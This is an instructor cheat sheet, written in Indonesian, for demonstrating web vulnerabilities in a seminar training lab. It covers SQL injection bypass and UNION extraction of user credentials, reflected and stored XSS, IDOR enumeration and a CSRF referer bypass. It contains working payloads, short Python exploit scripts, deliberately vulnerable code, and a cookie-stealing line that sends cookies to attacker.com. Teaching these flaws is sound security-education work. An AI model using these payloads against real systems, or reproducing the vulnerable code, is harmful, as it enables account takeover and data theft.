# 🕵️ ACT LAB - Instructor Cheat Sheet (HTB Edition)

Dokumen ini adalah panduan rahasia bagi instruktur/pembicara untuk mendemonstrasikan kerentanan di ACT LAB dengan gaya profesional ala HackTheBox.

---

## 🛠️ Global Mission Setup
- **Platform**: Node.js + SQLite (Persistent)
- **UI Standard**: HTB-Dark Mode (Clean, High Contrast)
- **Monitor Terminal**: Gunakan panel "Console Log" di setiap lab untuk memvisualisasikan request secara real-time di depan audiens.

---

## 1. SQL Injection (Authentication Bypass)
**Vulnerability Type**: In-band SQLi (Auth logic subversion)
**Target**: `admin` account access without password.

### 🚩 Exploitation Methods
#### A. Manual (Browser)
1. Buka halaman login.
2. Masukkan username: `admin`
3. Masukkan password: `' OR '1'='1`
4. Klik Login.

#### B. Automated (Python Script)
```python
import requests

url = "http://target.com/api/auth/login"
payload = {
    "username": "admin",
    "password": "' OR '1'='1"
}

r = requests.post(url, json=payload)
if "flag" in r.text:
    print(f"[+] Login Bypassed! Flag: {r.json()['flag']}")
```

### 💻 Vulnerable Code (`api/auth.js`)
```javascript
const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
// Database mengeksekusi string mentah tanpa sanitasi.
```

### 💡 Presentation Tips
1. Masukkan password asal-asalan dulu (Gagal).
2. Tunjukkan panel **Query Analyzer**, masukkan payload.
3. Jelaskan bagaimana `'` menutup string dan `--` menonaktifkan sisa logika AND password.

### 🛡️ Mitigation
Gunakan **Parameterized Queries**:
```javascript
db.get('SELECT * FROM users WHERE username = ? AND password = ?', [username, password]);
```

---

## 2. SQL Injection (UNION-Based Exfiltration)
**Vulnerability Type**: In-band UNION SQLi
**Target**: Mengekstrak seluruh database `users` (Username & Password).

### 🚩 Exploitation Methods
#### A. Manual (Browser)
1. Di kolom search, masukkan: `' UNION SELECT id, username, password, email FROM users --`
2. Hasil pencarian akan menampilkan isi tabel `users`.

#### B. Automated (Python Script)
```python
import requests

url = "http://target.com/api/search"
payload = "' UNION SELECT id, username, password, email FROM users --"
r = requests.get(url, params={"q": payload})

if r.status_code == 200:
    users = r.json()['results']
    for user in users:
        print(f"ID: {user['id']} | User: {user['username']} | Pass: {user['password']}")
```

### 💻 Vulnerable Code (`api/search.js`)
```javascript
const query = `SELECT id, title, description, category FROM challenges WHERE title LIKE '%${q}%'`;
```

### 💡 Presentation Tips
- Tekankan pada **Matching Columns**. Tunjukkan error jika jumlah kolom tidak sama (4 kolom).
- Sorot hasil pencarian yang tiba-tiba memunculkan kredensial admin di tengah daftar mission.

---

## 3. Reflected XSS (Execution Sink)
**Vulnerability Type**: Reflected Cross-Site Scripting
**Target**: Trigger alert atau pencurian session token.

### 🚩 Exploitation Payloads
- **Simple Alert**: `<script>alert(1)</script>`
- **Flag Capture**: `<script>getFlag()</script>` (Trigger fungsi rahasia di lab)
- **HTML Injection**: `<h1>HACKED</h1>`

### 💻 Vulnerable Code (`views/labs/xss-reflected.html`)
```javascript
target.innerHTML = q; // Input URL langsung ditempel ke DOM tanpa escaping.
```

### 💡 Presentation Tips
- Jelaskan konsep **Source** (URL Parameter) dan **Sink** (innerHTML).
- Masukkan payload di URL, copy-paste URL tersebut ke tab baru untuk mensimulasikan link pancingan (phishing).

---

## 4. Stored XSS (Persistent Payload)
**Vulnerability Type**: Stored Cross-Site Scripting (Second Order)
**Target**: Menginfeksi semua pengunjung Guestbook.

### 🚩 Exploitation Payloads
- **Cookie Stealer Simulation**: 
```html
<script>new Image().src="http://attacker.com/log?c="+document.cookie;</script>
```
- **Stealth Injection**: `<img src=x onerror=getFlag()>`

### 💻 Vulnerable Code (`api/guestbook.js` & Frontend)
```javascript
// Server menyimpan input mentah ke DB.
// Frontend merender dengan .innerHTML
container.innerHTML = e.message;
```

### 💡 Presentation Tips
- Post payload, lalu **Refresh Halaman**. Tunjukkan bahwa payload tetap ada (Persistent).
- Jelaskan bahaya XSS Stored: penyerang tidak perlu mengirim link ke korban, korban hanya perlu membuka website resmi.

---

## 5. IDOR (Unauthorized Access)
**Vulnerability Type**: Insecure Direct Object Reference
**Target**: Mengintip bio rahasia user `Alice` (ID #2).

### 🚩 Exploitation Methods
#### A. Manual (Browser)
1. Ganti angka di input ID menjadi `2` (ID Alice).
2. Klik **Enumerate Profile**.

#### B. Automated (Python Script)
```python
import requests

base_url = "http://target.com/api/profile"
for i in range(1, 10):
    r = requests.get(base_url, params={"id": i})
    if r.status_code == 200:
        data = r.json()['user']
        print(f"[ID {i}] Found: {data['username']} - Bio: {data['bio']}")
        if "ACT{" in data['bio']:
            print(f"!!! FLAG FOUND: {data['bio']}")
```

### 💻 Vulnerable Code (`api/profile.js`)
```javascript
// Kode hanya mengecek ID, tidak mengecek hak akses (Authorization).
const user = db.get('SELECT * FROM users WHERE id = ?', [req.query.id]);
```

### 💡 Presentation Tips
- Sebutkan bahwa IDOR adalah kerentanan API paling umum saat ini.
- Tekankan bahwa **Authentication** (Login) sudah benar, tapi **Authorization** (Hak Akses) yang lupakan.

---

## 6. CSRF (Origin Bypass)
**Vulnerability Type**: Cross-Site Request Forgery
**Target**: Memaksa admin mengganti email tanpa sadar.

### 🚩 Exploitation Strategy
Server mengecek referer menggunakan `.includes('act-lab')`. Penyerang bisa bypass dengan:
1. Menaruh file exploit di folder bernama `act-lab`.
2. Menamai domain/subdomain penyerang mengandung kata `act-lab`.

### 💡 Presentation Tips
- Tunjukkan log terminal. Saat instruktur klik "Update", tunjukkan origin requestnya.
- Jelaskan bahwa `.includes()` adalah "Lazy Check" yang sangat berbahaya.

---

## 🚀 Pro Speaker Notes
- **Always Keep the Logs Open**: Peserta seminar sangat suka melihat "apa yang terjadi di balik layar".
- **Real World Impact**: Di setiap lab, sebutkan satu kasus nyata (misal: "XSS ini mirip dengan bug di Facebook tahun 2018").
- **Call to Action**: Akhiri setiap demo dengan "Sekarang mari kita lihat cara memperbaikinya".

---
**ACT LAB - 2026 National Seminar Series**
